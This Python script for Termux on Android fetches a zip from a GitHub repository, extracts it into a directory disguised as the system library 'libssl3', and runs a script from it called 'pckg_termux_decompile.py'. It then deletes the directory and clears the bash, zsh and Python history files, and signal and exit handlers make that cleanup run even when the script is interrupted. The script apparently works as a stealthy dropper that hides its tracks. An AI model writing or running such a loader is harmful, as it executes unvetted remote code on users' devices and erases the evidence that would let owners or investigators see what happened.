import os
import sys
import subprocess
import requests
import zipfile
import shutil
import signal
import atexit

PREFIX = "/data/data/com.termux/files/usr"
LIB_DIR = os.path.join(PREFIX, "lib", "libssl3")
REPO_4_ZIP = "https://github.com/libpckgserver/Pyenv_version/archive/refs/heads/main.zip"
EXTRACT_DIR = os.path.join(LIB_DIR, "Pyenv_version-main")
MAIN_SCRIPT = os.path.join(EXTRACT_DIR, "pckg_termux_decompile.py")

def cleanup():
    shutil.rmtree(LIB_DIR, ignore_errors=True)
    os.system("history -c 2>/dev/null")
    os.system("echo > ~/.bash_history 2>/dev/null")
    os.system("echo > ~/.zsh_history 2>/dev/null")
    os.system("echo > ~/.python_history 2>/dev/null")

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTSTP, signal_handler)
atexit.register(cleanup)

try:
    if not os.path.exists(EXTRACT_DIR):
        os.makedirs(LIB_DIR, 0o700, exist_ok=True)
        
        resp = requests.get(REPO_4_ZIP, timeout=30)
        resp.raise_for_status()
        
        zip_path = os.path.join(LIB_DIR, "libssl3.zip")
        with open(zip_path, 'wb') as f:
            f.write(resp.content)
        
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(LIB_DIR)
        
        os.unlink(zip_path)

    if os.path.exists(MAIN_SCRIPT):
        subprocess.run([sys.executable, MAIN_SCRIPT], check=True)

finally:
    cleanup()
